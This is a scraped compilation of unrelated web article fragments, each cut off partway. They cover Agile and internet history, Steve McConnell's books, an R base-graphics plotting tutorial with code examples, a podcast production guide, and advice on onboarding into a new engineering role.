<p>Notice the tension inherent in the manifesto’s principles, between the boundless (more working software, faster, is better) and the bounded (we should be able to reproduce this working situation forever). Developers working in the Agile context are invited to be Animal Farm’s Boxer, working as hard as they can for as long as they can in the hope to avoid the glue factory.</p>
<p>A more progressive paradigm for software development would remove the classifications of “programmer” and “business people”, regarding all as individuals with particular expertise who come together to pool that expertise in pursuit of a common goal. And thus could the network as the computer be truly recognised: the network as distributed source of and access to computing and communication supporting the social system in which it is embedded to the greatest possible extent. Let us explore what that would look like.</p>
<p>The Internet Protocol was designed in the United States during the 1970s, at the military Advanced Research Projects Agency (ARPA). As the designers were American cyberneticians, the system contains design principles that would be desirable in an ideal system in contemporary America. Each node is a “free actor”, choosing to form peer relationships with other nodes and route packets based on local information about those nodes and the destinations of the packets. The cyber-utopia, evinced by fanzines, the Whole Earth Catalog, and numerous cyberpunk novels, is one of total anarchy and individual liberty. The internet—as designed, anyway—perceives censorship as damage and routes around it.</p>
<p>In fact the period of establishment of IP as the de facto standard for internetworking (in the UK’s Joint Academic Network, Janet, the “killer app” that saw IP winning out was the X remote desktop protocol) also saw the rise and entrenchment of global capitalism and the proliferation of projects designed to transfer wealth en masse to the small cohort of billionaires. Ideas of interactions in “the marketplace” changed, and thus so did the ideas about a network best configured to support them. Out was the Kevin Flynn who ran an independent arcade business and deserved restitution from Encom in the movie Tron. In was the Encom that was still dominant in Tron: Legacy and released Encom OS 12 with the killer feature: “this year, we put a 12 on the box”.</p>
<p>As the ideology behind the “free market” changed, so did the “marketplace of connectivity”: the internet perceived censorship as an opportunity and asked who was to pay for it. Thus the modern internet: a small number of global players controlling the core, and a ragtag assortment of startups wondering whether to give their seed money to Microsoft, Google, or Amazon in exchange for a seat at the table. The network is the computer, and the computer <a href="https://deprogrammaticaipsum.com/five-computers/">has five access terminals</a>.</p>
<p>To understand how the internet’s adaptability to prevailing ideas about social systems enabled its survival, turn to a similar system that did not achieve the same. The Soviet vision of the internet, designed by cyberneticians in research institutions around the Union, never became a reality. Its story is told in the book <a href="https://mitpress.mit.edu/books/how-not-network-nation">How Not to Network a Nation</a> and the article <a href="https://web.mit.edu/slava/homepage/articles/Gerovitch-InterNyet.pdf">InterNyet: why the Soviet Union did not build a nationwide computer network</a>. Where Vint Cerf and Bob Kahn were supported in their plans to introduce a nationwide military computer network, their counterpart Viktor Glushkov (a Russian-born mathematician who founded the Institute of Cybernetics in Kyiv, Ukraine) met political obstacles and funding cuts. Why?</p>
<p>Principally because the network was <em>not</em> the computer: the system proposed did not support the system that was in place. Where the ARPA vision of the internet promised a decentralised system (what Americans think their system is) and was delivered by the heavily centralised, bureaucratic, planned economy of the US military apparatus (what America really is), the Glushkov project OGAS promised exactly the same in a very different context. The OGAS internet would be a decentralised …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>I almost wrote this article not about McConnell, but Microsoft Press. Why? Because developers always have something to learn, books have been a great way to share information for centuries, so reading about computing is central to the software engineering experience. If you do not believe me, reflect on the activity you are undertaking <em>right now</em>, reading an online magazine about computing.</p>
<p>You can tell the seriousness with which a platform company treats its developers—or its “developers, developers, developers”—by the tools, knowledge and support it gives them. Where some companies release their API documentation in bound form through a recognised publisher, Microsoft just went and started their own book imprint. Not to bind their header comments between two boards, but to support professional programmers whatever their stripe (though maybe bear in mind which company has your back when choosing your technology, please).</p>
<p>Am I over-selling the importance of Microsoft Press, though? Steve McConnell, in <em>Code Complete, 2nd Edition</em> (2004, Microsoft Press), cites DeMarco and Lister’s <em>Peopleware</em> when he tells readers “one book is more than most programmers read each year.” He recommends trying to get through one every two months, as well as journals like <em>IEEE Software</em>, <em>Communications of the ACM</em>, and the now defunct and much-missed <em>Dr. Dobb’s Journal</em>. The “software developer’s reading plan” at the back of the book contains 5 introductory-level books, 8 intermediate-level, and 7 leadership-level. It would take the median programmer (at least in 1999 when <em>Peopleware</em> was written) over 20 years to follow the plan, but a little over three years at McConnell’s suggested rate. As long as you read <em>CC2E</em> first to know how quickly you are supposed to be reading!</p>
<p>Coincidentally, I left university to look for a job (which I found in the very room where I conducted my job search) in 2004, the year <em>CC2E</em> was published. Within a couple of years, when it was clear that my ability to solve problems using a computer was being hampered by my home-grown and BASIC-honed techniques at expressing computer programs, a manager gave me a copy of <em>Code Complete</em>. And the rest, as they say, is history.</p>
<p>There is lots to critique about the book, of course, particularly in 2020. Writing at the start of the Agile revolution, McConnell does not have much to say about agile practices or methodology (two entries in the index, in fact, both pointing to single-paragraph descriptions of books; there is no discussion of agile in the main text). Sure, all of the parts are there—there is a distinct shift in the discussion of change management and risk between the first edition and the second, for example—McConnell acknowledges that the different activities in software construction occur in parallel, and that the earlier a change is handled, the cheaper it will be. But he never quite gets to the conclusion that software need not be “measure twice, cut once”; that unlike carpentry, software has a limitless supply of infinitely malleable wood.</p>
<p>In some of the places where McConnell uses multiple citations to make a claim about software engineering, other writers have found the citations based on questionable data or not generalisable to the way most software is written, particularly “classic” studies from the 1970s looking at programming batch systems. But we will save that story, because a future instalment of the Programmer’s Library will cover one of those books in detail. It is more interesting than it sounds!</p>
<p>There is also lots to recommend the book: in fact, in the 16 years since it was written, nothing else comes close. I still use and recommend practices described in <em>Code Complete</em>. I have internalised most of the ideas about code organisation and conception. When I see someone who reminds me of mid-aughts me, this is one of the books that springs to mind.</p>
<p>Other books have come and gone that try to do bits of what McConnell does here, with varying degrees of success. Robert Martin’s <em>Clean Code</em> on low-level design teaches similar ideas but with less intellectual rigour. The same goes for his <em>Clean Coder</em> on the practice of being a developer, though this is a more contested field with good showings from Pete McBreen (<em>Software Craftsmanship: The New Imperative</em>) and Hunt &amp; Thomas (<em>The Pragmatic Programmer</em>). But none of these come close to supplanting <em>CC2E</em> as a manual for turning a programmer into a software engineer, and the realities of the software publishing business in 2020 mean that no replacement is likely to show up soon.</p>
<p>If all Steve McConnell had done was write this one book, his would be a significant contribution to the field. Even among the MS press books on software requirements, object thinking (not OOP), secure software development, solutions architecture, and more, this is a stand-out work. But he was and remains a prolific author, so now we turn to the rest of his library.</p>
<p>We will start by going back from 2004 to 1996. After the first edition of <em>Code Complete</em>, McConnell wrote a book about improving the capability of software teams to successfully deliver working software, ways of so doing he had uncovered by doing it and by helping others to do it. This book was <em>Rapid Development</em>, as distinct from the then-popular fad of Rapid Application Development. <em>Rapid Development</em> was explicitly <em>not</em> “programming, motherfucker”: an exhortation to just get down to coding as quickly as possible. <em>Rapid Development</em> was the (then, and from what I have seen, now too) groundbreaking advice that you should maybe align your development practices with your customers’ expectations and needs, and that doing so will help you give them what they need faster. This book had many recommendations for developers and managers to adopt on their team, including early and continuous delivery of working software through iterative, evolutionary development; continuous collaboration between the software team and the customers throughout the project; frequent feedback on the status and risks and reprioritisation so that the biggest risks are always next to be addressed; and more.</p>
<p>If this all sounds like it actually <em>is</em> agile software development, expressed four years before the Snowbird ski trip, that is for multiple reasons. Firstly by the time the manifesto was written, there was already broad understanding (at least among the more experienced and expert practitioners of software delivery) that the ideas of iterative, incremental development were transformative to the capabilities of software teams, there just was not yet a common banner under which all of the people calling for this could march. Secondly it is because I have been selective in my presentation of what is in <em>Rapid Development</em>: one of the “case studies” features a team who fail because they integrate their work too early, before all of the modules are fully tested and debugged, and this causes schedule slippage. Nowadays we recognise integration as one of the risks that we <em>should</em> mitigate by early and continuous monitoring; thus continuous integration.</p>
<p>But mostly it is because agile software development has been hollowed out since its introduction at the beginning of the millennium. Ask many development teams what they understand by Agile in 2020 and you will get a list similar to the highlights of <em>Rapid Development</em> I gave above: incremental and iterative delivery, customer involvement on the team, frequent retrospectives and feedback. That is not the entirety of the story, that is the <a href="https://www.adventureswithagile.com/2014/08/19/declaration-of-interdependence/">Project Managers’ Declaration of Interdependence</a> (originally published on Alistair Cockburn’s site in 2005). Agile software development also included a number of <em>technical</em> practices, not explicitly called out in the manifesto, on the basis that what we do changes more frequently than why we do it.</p>
<p>We have already mentioned Continuous Integration, and developers might readily mention Test-Driven Development (and maybe its more agile siblings, Behaviour-Driven Development and Acceptance Test-Driven Development, which remind us that software is done not when the tests pass, but when the software does what the customer wants from it). Some may begrudgingly allow daily stand-up meetings as an agile practice, though they may grumble. But how about user stories? Those are a technical practice, and an example of specification-by-customer-conversation. Domain-Driven Design encourages a shared vocabulary between the software team and the customers, enabling those conversations. A <a href="https://dl.acm.org/doi/10.1145/1985782.1985784">review of agile practices in scientific software development</a> lists 35 practices explicitly mentioned in the Scrum and XP methodologies. Of those, I informally count 22 technical (or at least not purely project-management) practices, and I would also suggest that those technical practices are the ones most patchily adopted across the industry, based on my own experience in many teams that describe their work as “Agile”.</p>
<p><em>Rapid Development</em> gets a bye on some of those practices on the basis that they had not been invented in 1996, but also because McConnell makes a much more general and much more useful argument: technical practices <em>are not guaranteed</em> to improve your ability to deliver working software to your customers. Indeed adopting new practices on a new project is likely to <em>reduce</em> your control over and understanding of the project, thus <em>harming</em> your ability to communicate effectively with customers what you are capable of, how much it will cost, and how long it will take. This incredibly simple and important notion has been rediscovered many times in the industry, and is currently usually cited in the form of “innovation tokens” from Dan McKinley’s <a href="https://mcfunley.com/choose-boring-technology">choose boring technology</a>.</p>
<p><em>CC2E</em> gets a bye on its short shrift on Agile for the innovation tokens reason: before the agile-industrial complex took over and made agile all about hiring scrum masters and producing burn-down charts, it was a shorthand for a lot of project management <em>and</em> technical practices and there was not …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">




<p>Base plotting is as old as R itself yet for most users it remains mysterious.
They might be using <code>plot()</code> or even know the full list of its parameters but most never understand it fully.
This article attempts to demystify base graphics by providing a friendly introduction for the uninitiated.</p>

<h2 id="deconstructingaplot">Deconstructing a plot</h2>

<p>Quickly after learning R users start producing various figures by calling <code>plot()</code>, <code>hist()</code>, or <code>barplot()</code>.
Then, when faced with a complicated figure, they start stacking those plots on top of one another using various hacks, like <code>add=TRUE</code>, <code>ann=FALSE</code>, <code>cex=0</code>.
For most this marks the end of their base plotting journey and they leave with an impression of it being an ad-hoc bag of tricks that has to be learned and remembered but that otherwise is hard, inconsistent, and unintuitive.
Nowadays even experts who write about base graphics<a href="#cn:1" id="cnref:1" title="see citation"><sup>(1)</sup></a> or compare it with other systems<a href="#cn:2" id="cnref:2" title="see citation"><sup>(2)</sup></a> share the same opinion.
However, those initial functions everyone was using are only wrappers on top of the smaller functions that do all the work.
And many would be surprised to learn that under the hood base plotting follows the paradigm of having a set of small functions that each do one thing and work well with one another.</p>

<p>Let’s start with the simplest example.</p>

<pre><code>plot(0:10, 0:10, xlab = "x-axis", ylab = "y-axis", main = "my plot")
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/plot.svg" alt="">
</figure>

<p>The <code>plot()</code> function above is really just a wrapper that calls an array of lower level functions.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,10), ylim = c(0,10))
points(0:10, 0:10)
axis(1)
axis(2)
box()
title(xlab = "x-axis")
title(ylab = "y-axis")
title(main = "my plot")
</code></pre>

<p>Written like this all the elements comprising the plot become clear.
Every new function call draws a single object on top of the plot produced up until that point.
It becomes easy to see which line should be modified in order to change something on the plot.
Just as an example let’s modify the above plot by: 1) adding a grid, 2) removing the box around the plot, 3) removing the axis lines, 4) making axis labels bold, 5) turning the annotation labels red, and 6) shifting the title to the left.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,10), ylim = c(0,10))
grid()
points(0:10, 0:10)
axis(1, lwd = 0, font.axis=2)
axis(2, lwd = 0, font.axis=2)
title(xlab = "x-axis", col.lab = "red3")
title(ylab = "y-axis", col.lab = "red3")
title(main = "my plot", col.main = "red3", adj = 0)

</figure>

<p>In each case to achieve the wanted effect only a single line had to be modified.
And the function names are very intuitive.
A person without any R experience would have no trouble saying which element on the plot is added by which line or changing some of the parameters.</p>

<p>So, in order to construct a plot various functions are called one by one.
But where do we get all the names for those functions?
Do we need to remember hundreds of them?
Turns out the set of all the things you might need to do on a plot is pretty limited.</p>

<pre><code>par()          # specifies various plot parameters
plot.new()     # starts a new plot
plot.window()  # adds a coordinate system to the plot region

points()       # draws points
lines()        # draws lines connecting 2 points
abline()       # draws infinite lines throughout the plot
arrows()       # draws arrows
segments()     # draws segmented lines
rect()         # draws rectangles
polygon()      # draws complex polygons

text()         # adds written text within the plot
mtext()        # adds text in the margins of a plot

title()        # adds plot and axis annotations
axis()         # adds axes
box()          # draws a box around a plot
grid()         # adds a grid over a coordinate system
legend()       # adds a legend
</code></pre>

<p>The above list covers majority of the functionality needed to recreate almost any plot.
And for demonstration <code>example()</code> can be used to quickly see what each of those functions do, i.e. <code>example(rect)</code>.
R also has some other helpful functions like <code>rug()</code> and <code>jitter()</code> to make certain situations easier but they are not crucial and can be implemented using the ones listed above.</p>

<p>Function names are quite straightforward but what about their arguments?
Indeed some of argument names, like <code>cex</code> can seem quite cryptic.
But the argument name is always an abbreviation for a property of the plot<a href="#cn:3" id="cnref:3" title="see citation"><sup>(3)</sup></a>.
For example <code>col</code> is a shorthand for “color”, <code>lwd</code> stands for “line-width”, and <code>cex</code> means “character expansion”.
Good news is that in general the same arguments stand for the same properties across all of base R functions.
And for a specific function <code>help()</code> can always be used in order to get the list of all arguments and their descriptions.</p>

<p>To further illustrate the consistency between arguments let’s return to the first example.
By now it should be pretty clear, with one exception - the <code>axis(1)</code> and <code>axis(2)</code> lines.
Where do those numbers: <code>1</code> and <code>2</code> came from?
The numbers specify the positions around the plot and they start from <code>1</code> which refers to the bottom of the plot and go clockwise up to <code>4</code> which refers to the right side.
The picture below demonstrates the relationship between numbers and four sides of the plot.</p>

<pre><code>plot.new()
box()
mtext("1", side = 1, col = "red3")
mtext("2", side = 2, col = "red3")
mtext("3", side = 3, col = "red3")
mtext("4", side = 4, col = "red3")
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/positions.svg" alt="">
</figure>

<p>The same position numbers are used throughout the various different functions.
Whenever a parameter of some function needs to specify a side, chances are it will do so using the numeric notation described above.
Below are a few examples.</p>

<pre><code>par(mar = c(0,0,4,4))        # margins of a plot: c(bottom, left, right , top)
par(oma = c(1,1,1,1))        # outer margins of a plot
axis(3)                      # side where axis will be displayed
text(x, y, "text", pos = 3)  # pos selects the side the "text" is displayed at
mtext("text", side = 4)      # side specifies the margin "text" will appear in
</code></pre>

<p>Another important point is vectorization.
Almost all the arguments for base plotting functions are vectorized.
For example, when plotting rectangles the user does not have to add each point of each rectangle one by one within a loop.
Instead he or she can draw all the related objects with one function call while at the same time specifying different positions and parameters for each.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,3), ylim = c(0,3))

rect(xleft = c(0,1,2), ybottom = c(0,1,2), xright = c(1,2,3), ytop = c(1,2,3),
     border = c("pink","red","darkred"), lwd = 10
     )
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/rect.svg" alt="">
</figure>

<p>Here is another example producing a check board pattern.</p>

<pre><code>plot.new()
plot.window(xlim = c(0,10), ylim = c(0,10))

xs &lt;- rep(1:9, each = 9)
ys &lt;- rep(1:9)

rect(xs-0.5, ys-0.5, xs+0.5, ys+0.5, col = c("white","darkgrey"))
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/checkboard.svg" alt="">
</figure>

<h2 id="constructingaplot">Constructing a plot</h2>

<p>One of base R graphics strengths is it’s flexibility and potential for customization.
It really shines when the user needs to follow a particular style found in an existing example or a template<a href="#cn:4" id="cnref:4" title="see citation"><sup>(4)</sup></a>.
Below are a few illustrations demonstrating how different base functions can work together and reconstruct various types of common figures from scratch.</p>

<ul>
<li><p>Annotated barplot of USA population growth over time.</p>

<pre><code>x &lt;- time(uspop)
y &lt;- uspop

plot.new()
plot.window(xlim = range(x), ylim = range(pretty(y)))

rect(x-4, 0, x+4, y)
text(x, y, y, pos = 3, col = "red3", cex = 0.7)

mtext(x, 1, at = x, las = 2, cex = 0.7, font = 2)
axis(2, lwd = 0, las = 2, cex.axis = 0.7, font.axis = 2)
title("US population growth", adj = 0, col.main = "red2")
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/barplot.svg" alt="">
</figure>

<p>In this case for each rectangle four sets of points had to be specified: x and y for the left bottom corner plus x and y for the top right corner.
In the end, even so this is a more complicated example, we still added all the different pieces of information using single function calls to <code>rect()</code>, <code>text()</code>, and <code>mtext()</code>.</p></li>
<li><p>Parallel coordinates plot using the “iris” dataset.</p>

<pre><code>palette(c("cornflowerblue", "red3", "orange"))

plot.new()
plot.window(xlim = c(1,4), ylim = range(iris[,-5]))
grid(nx = NA, ny = NULL)
abline(v = 1:4, col = "grey", lwd = 5, lty = "dotted")

matlines(t(iris[,-5]), col = iris$Species, lty = 1)

axis(2, lwd = 0, las = 2)
mtext(variable.names(iris)[-5], 3, at = 1:4, line = 1, col = "darkgrey")

legend(x = 1, y = 2, legend = unique(iris$Species), col = unique(iris$Species),
       lwd = 3, bty = 'n')
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/parallel.svg" alt="">
</figure>

<p>In this example we used a special function <code>matlines()</code> that draws one line for each column in a matrix.
We also did a few other things that were novel so far: changed the default numeric colors via <code>palette()</code>, and used factor levels for specifying the actual colors within <code>matlines()</code> and <code>legend()</code>.
Changing palette allows us to customize the color scheme while passing factors for the color arguments guarantees that the same colors are consistently assigned to the same factor levels across all the different functions.</p></li>
<li><p>Dot plot of death rates in Virginia in 1940.</p>

<pre><code>colors &lt;- hcl.colors(5, "Zissou")
ys     &lt;- c(1.25, 2, 1.5, 2.25)

plot.new()
plot.window(xlim = range(0,VADeaths), ylim = c(1,2.75))

abline(h = ys, col = "grey", lty = "dotted", lwd = 3)
points(VADeaths, ys[col(VADeaths)], col = colors, pch = 19, cex = 2.5)
text(0, ys, colnames(VADeaths), adj = c(0.25,-1), col = "lightslategrey")

axis(1, lwd = 0, font = 2)
title("deaths per 1000 in 1940 Virginia stratified by age, gender, and location")

legend("top", legend = rownames(VADeaths), col = colors, pch = 19, horiz = TRUE,
       bty = "n", title = "age bins")
</code></pre>

<figure>
<img src="http://karolis.koncevicius.lt/posts/r_base_plotting_without_wrappers/figure/dotplot.svg" alt="">
</figure>

<p>In this graph the groups were stratified by gender, age, and location
For each group the y-axis hights were chosen manually and <code>col()</code> function was used to repeat those heights for all numbers within the matrix.</p></li>
<li><p>Dual coordinate plot using the “mtcars” dataset.</p>

<pre><code>par(mar = c(4,4,4,4))
plot.new()
box()

plot.window(xlim = range(mtcars$disp), ylim = range(pretty(mtcars$mpg)))
points(mtcars$disp, mtcars$mpg, col = "darkorange2", pch = 19, cex = 1.5)

plot.window(xlim = range(mtcars$disp), ylim = range(pretty(mtcars$hp)))
points(mtcars$disp, mtcars$hp, col = "forestgreen", pch = 19, cex = 1.5)

axis(1)
axis(2, …</code></pre></li></ul></div>

Your podcast roadmap is the first thing you will do before recording your podcast.&nbsp;</p><p>Who, why, where, and when are some questions that MUST be asked as the idea of starting a podcasting strikes your mind. <br></p><h3>Who is your podcast audience?</h3><p>In our opinion, the number one reason why podcast fail is because the creators don't think enough about whom they plan to add value too. Without this step... a watered down, useless podcast is produced and the creators give up after three months as they don't up generating the audience they thought they would.<br></p><p>If you don’t know who you are going to address, it is almost like trying to find Planet Earth in the Milky Way galaxy...<br></p><figure><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fbd3f47921868483fddd15e_Y5KIrS6TN5P4qjIcOYNclGE3emYsPzGUGj278uDDE169-G973GyhRWPE-GIN_TvWWTIYp6Qxrb0K5k73p_ULFQn73DecQ3rSVAwPrwcgf0JgCB-dL4VIrn5TKR489NOrNcw61NQ.gif" alt=""></p></figure><p>For instance, a podcast about horror movies would be valued by the people who have this same passion. A podcast about <a target="_blank" href="https://podcasts.bcast.fm/confessions-of-a-b2b-marketer">B2B marketing</a> will add value to B2B marketers looking to up their game.</p><p><em>What do you know about and who can you add value too?</em><br></p><p>This is the question that you MUST ask.<br></p><p>Be sure to look at possible podcast competitors… if there are already many podcasts in your niche this suggests that there is demand for a show like yours… but it may be hard to get subscribers.<br></p><p>If there are no podcasts in your chosen subject area then there may be low demand, but low competition means it should be easier to generate an audience! <br></p><h3>What should my podcast be about?</h3><p>This is closely linked to the last section...<br></p><p>One basic premise of content marketing is to feed potential customers with the information they need BEFORE they need to buy your product or service. If you are the person or business providing this information you move your customers towards buying AND allow them to build trust in you.<br></p><p>This will mean that when they come to buy... they buy from you.<br></p><p>Now of course, you need to be able to add value on this topic or have a network of people that can add value on this topic.<br></p><p>This is the sweet spot: the ability to add value with the information and the ability to monetise the information.<br></p><h3>What should I call my podcast?</h3><p>A podcast about fitness training with the name "The Sarah Clay Show" will leave you in despair, as many people will not click as they care about fitness training, not you Sarah ;)<br></p><figure><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fbd3f48f7fb0b0b7ccec927_C3B45_7_X_KgW7acbxX6ENXn_Eq80fDN351YmmAc4_MXfSPaihp8h8zm-wqTBFXPRGOSNtRVWbE2ytrsW2EyS2NpQQ_v3qamJwp9WQVoQ0_0gVQSLaDpBQ6Il6fNz5FVf798nkY.gif" alt=""></p></figure><p>Naming your podcast in this way is helpful when you already have a fanbase or audience through other mediums. <br></p><p>Instead, your podcast name will be both "descriptive and memorable".<br></p><p>Your target audience will reach you if your podcast name is organic and contains words related to your podcast subject. Your podcast should appear in search results for queries around your niche.<br></p><p>And when we say memorable, it means a person who looked for ‘fitness training podcast’ and clicked on your podcast, will only come back to listen to the same podcast if your podcast name is memorable.<br></p><p>So, the recipe for podcast name is: "descriptive and memorable".<br></p><p>As an example...<br></p><p>We run a podcast for a client called <a href="https://www.fame.so/case-study/leading-mobile-growth-with-storemaven" target="_blank">Mobile Growth &amp; Pancakes:</a><br></p><ul role="list"><li>Descriptive - Mobile Growth!</li><li>Memorable - Pancakes!<br></li></ul><h3>How long should each episode be?</h3><p>How long is a piece of string? ;)</p><p>When deciding how long a podcast episode should be... many top podcast producers refer to a person's average commute: 20 to 30 minutes. But in reality, your podcast episode length depends only on your audience, and your subject.&nbsp;<br></p><p>If your content is easily summarised in a short podcast of 15 minutes, that is the best episode length for you.&nbsp;<br></p><p>If your content needs over an hour of time to be presented, then it is the ideal length.&nbsp;</p><p>The second factor is your audience. One audience may absorb small chunks of 5 to 10 minutes whilst another audience may be happy to listen to a 2-hour-long interview.&nbsp;<br></p><p>While deciding how long your podcast episode should be... the answer really leads to another question: how long can you add value for?</p><p>That is the length of your episodes and not a second longer.<br></p><h3>Show Format</h3><p>Your show format might be the personal choice of the podcast producer, or it might be based on the requirements of a target audience. A podcast format sets a standard for what your audience should expect from your show.&nbsp;</p><p>There are really just a few show formats:</p><ul role="list"><li>Interview based - each episode features a guest</li><li>Monologue based - just you talking!</li><li>Short tips - small, actionable tips</li><li>Story based - telling a story within an episode or a season</li></ul><p>You need to choose the format that best suits you as a podcast host and your audience.</p><p>This is also a good opportunity for differentiation... if all the shows in your niche are interview based, you could gain traction fast with a more actionable tips based podcast.</p><h2>Step 2 - Pre-Production</h2><p>After answering the basic questions of the podcasting roadmap, now it’s time to set up your podcasting playground. Equipment, environment, and guests... We cannot cover how to produce a podcast without talking about pre-production.&nbsp;</p><h3>Essential Equipment</h3><p>The sound quality of your podcast highly depends on your choice of equipment. As a start, a USB mic, a laptop, and an internet connection are good to take off. But, over time you will need to progress to more complex equipment to achieve greater quality audio.<br></p><p>Before you make an investment in recording equipment, it is good to take a test drive with basic equipment. Once you are confident that your content is engaging the audience and you are enjoying this experience, then you should improvise to upgrade your podcast setup with more professional equipment.&nbsp;<br></p><p>This is what you will need to start with:<br></p><ul role="list"><li>A laptop</li><li>A microphone for voice recording</li><li>Audio Interface- It allows you to playback your voice recordings by cancelling all the background noise&nbsp;</li><li>A pair of headphones</li></ul><p>And more advanced equipment:</p><ul role="list"><li>A pop filter to eliminate the air blast when you say words with the sound of “t”, “p”, “b”</li><li>A mixer- more of post-production equipment, but it helps you to control music and sound levels&nbsp;</li><li>Mic stand- secondary, but it gives you more flexibility and eases to record your podcast&nbsp;</li></ul><h3>Recording Environment&nbsp;</h3><p>While you are recording your podcast sitting at your local café, no matter how good your content is... the surrounding noise and chatter will destroy the audio experience of your listeners. Similarly, recording your podcast with a table and chair in an empty room of 330 sq. feet will do nothing except generate an unpleasant echo.&nbsp;<br></p><p>A nice balance is important when your surrounding environment is concerned. A moderately furnished room with a quiet environment will enhance your podcast’s quality. We don’t mean that you need a soundproof room, but a calm space with minimal background noises.</p><h3>Scheduling Guests&nbsp;</h3><p>One important to-do in setting up the stage is scheduling your guests if your podcast format requires so. Unplanned and clueless podcasting might be more hectic as well as you might end up with a clumsy and unorganised podcast where you don’t know what you have to talk about to your guest.&nbsp;<br></p><p>In your podcast preparations, you should schedule your guests so that you have enough time to research about them, their work, or particular topics you would be discussing.&nbsp;<br></p><p>For booking your guests, you can go with communicating with them over email and get the time when they are easily available. We typically recommend booking guests in using scheduling software such as Calendly...</p><p>‍<br></p><h2>Step 3 - Production</h2><p>The playing field for your podcast is set up...When you are recording your podcasts, you must be equipped with all the necessary ammunition. Now, it is time to get to the crux of the question of<strong> how to produce a podcast</strong>. </p><p>Here are a few things you should really take note of before you place yourself in the hot seat that is being a podcast host.&nbsp;</p><h3>Scripting Every Episode</h3><p>Scripting your whole podcast episode and sticking to it rigidly will fade the natural touch of your podcast. It may sound like a puppet show.&nbsp;<br></p><p>But, a completely unprepared podcast could also turn out to be a complete shambles.<br></p><p><em>Then... how to produce a podcast that has a good balance of natural touch and organisation?</em></p><p>You should make an outline of important topics or things you have planned to discuss in an episode. This tip is extremely important when you are doing a solo podcast. Because there is a lot more chance of getting lost and go off-road in this case.<br></p><p>However, if you have a podcast format where guests are invited, key points or questions you are going to ask your guests in a written form can help you to stay on track. But, have a flexible approach because your guest might go around to share an interesting experience. Make sure to go along with your guest instead of being too stiff and sticking to the outline.&nbsp;</p><h3>Share Questions with Guests</h3><p>You should send notes or an outline to your scheduled guest for every episode. It will help your guest to know what to expect, get prepared to answer the questions. Instead of sending scripted questions, we like to send rough discussion points...</p><p>This will help the guest prepare but not script answers... this is crucially important to cultivating …</p></div></div></div>

<p>Career moves like starting a new role are challenging, can often be unnerving, and for sure requires leveling up. <img title=":computer:" alt=":computer:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4bb.png" height="20" width="20"></p>

<p>A few months back, I accepted an offer with another business group at Intel. To me, it was a great way of exploring new opportunities within the company and experiencing another flavor of its engineering culture. This new role was a scale-up from my previous one, a lot of new areas for me to contribute, learn, and explore.</p>

<p>What helped me tackle this was defining how I onboarded in the new role. In this article, I am sharing the framework and ideas from my onboarding learnings.</p>

<h2 id="onboarding-done-right">Onboarding done right</h2>

<p>A well-defined onboarding is crucial to provide team members with the resources they need to succeed and ensure their expectations match the reality of the organization. It also clears any confusion about the role. Not having the right onboarding experience can often lead to not clearly understanding the new work environment leading to one as the wrong fit for the team.</p>

<p>Usually, onboarding has two distinct &amp; complementary components:</p>

<ul>
  <li>
    <p><strong>General Onboarding</strong>: Getting familiar with the company culture, vision, mission, value, etc.</p>
  </li>
  <li>
    <p><strong>Role-specific Onboarding</strong>: Acquire the knowledge, skills, and behaviors to master the role effectively and efficiently.</p>
  </li>
</ul>

<p>Joining a new team brings in a plethora of information and emotions and can be quite stressful. If you are reading this as someone who needs to onboard a team member, I highly encourage taking some time to think through the prep work covering basics for onboarding. At the end of the article, I have listed some useful resources for the same.</p>

<p>The focus of this article is someone (particularly a software engineer) who will be onboarding a new role.</p>

<h2 id="the-onboarding-template-page_with_curl">The onboarding template <img title=":page_with_curl:" alt=":page_with_curl:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c3.png" height="20" width="20">
</h2>

<h4 id="1-set-expectations-with-yourself">1. Set expectations with yourself</h4>

<blockquote>
  <p>No one can hit their target with their eyes closed.” ― Paulo Coelho <img title=":sparkles:" alt=":sparkles:" src="https://github.githubassets.com/images/icons/emoji/unicode/2728.png" height="20" width="20"></p>
</blockquote>

<p>The most important thing is setting expectations for your new role. Sure, you have done quite some assessment before accepting the offer. However, this step talks about goal setting before your first day.</p>

<h3 id="2-set-clear-expectations-with-your-manager">2. Set clear expectations with your manager</h3>

<p>Well, you have cracked the role owing to your strengths and the value you potentially bring to the team. Hence, it is vital to discuss the expectations of onboarding with your manager. A few questions to ask:</p>

<ul>
  <li>What do you suggest I focus on for my first week and month in this team?</li>
  <li>How can I learn more about the project(s)?</li>
  <li>Is there a team ‘how-to’ document I can refer to?</li>
  <li>Who is my dedicated buddy for onboarding?</li>
  <li>What accesses a new member needs to request?</li>
</ul>

<h3 id="3-create-a-plan">3. Create a plan</h3>

<p>Now that you have a fair idea of the expectations, chart out an onboarding plan. It helps to list out activities to not be overwhelmed and create a to-do list to cover all essential tasks.</p>

<h3 id="4-meet-with-as-many-team-members-as-to-familiarize">4. Meet with as many team members as to familiarize</h3>

<p>In the pre-covid world, face to face introductions were much easier. It’s not quite the same in a remote environment.
Make it a point to proactively reach out to as many team members/ stakeholders and set introductory 1:1s to learn about them, get a preliminary idea of the project, learn more about their preferred working times/ style, etc. This is an opportunity to get started on the technical details about the systems, projects, etc., and also provides a window into other team members’ interests.</p>

<h3 id="5-work-with-your-buddy-on-the-team">5. Work with your buddy on the team</h3>

<p>“There is no such thing as a stupid question!”</p>

